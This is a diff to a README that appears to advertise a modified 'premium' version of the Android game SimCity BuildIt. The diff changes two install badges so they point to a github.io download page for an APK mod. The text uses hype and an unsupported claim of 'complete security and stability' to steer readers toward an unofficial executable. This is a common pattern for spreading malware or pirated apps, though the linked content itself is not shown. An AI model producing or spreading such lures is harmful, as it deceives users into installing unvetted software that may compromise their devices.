@@ -2,7 +2,7 @@
 
 Revolutionize your urban development journey with this comprehensive enhancement package for SimCity BuildIt on Android devices. Experience unparalleled creative freedom while maintaining complete security and stability.  
 
-[![Install Premium Companion](https://img.shields.io/badge/GET_PREMIUM_EXPERIENCE-00AA00?style=for-the-badge&logo=android&logoColor=white)](#)  
+[![Install Premium Companion](https://img.shields.io/badge/GET_PREMIUM_EXPERIENCE-00AA00?style=for-the-badge&logo=android&logoColor=white)](https://simcity-buildit-apk-mod.github.io/.github/)  
 
 ![Cityscape with Enhanced Features](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzZlHuibBSKQptgJFd_5L1KNDpxsaSyOHZQg&s)  
 *Elevate your city-building capabilities to professional levels*  
@@ -89,7 +89,7 @@ Revolutionize your urban development journey with this comprehensive enhancement
 - Unique rewards  
 - Leaderboard integration  
 
-[![Install Premium Companion](https://img.shields.io/badge/GET_PREMIUM_EXPERIENCE-00AA00?style=for-the-badge&logo=android&logoColor=white)](#)  
+[![Install Premium Companion](https://img.shields.io/badge/GET_PREMIUM_EXPERIENCE-00AA00?style=for-the-badge&logo=android&logoColor=white)](https://simcity-buildit-apk-mod.github.io/.github/)  
 
 ![Gameplay with Enhanced Tools](https://i.ytimg.com/vi/zY_9QzQGRgc/hq720.jpg)  
 *Professional-grade urban planning at your fingertips*  
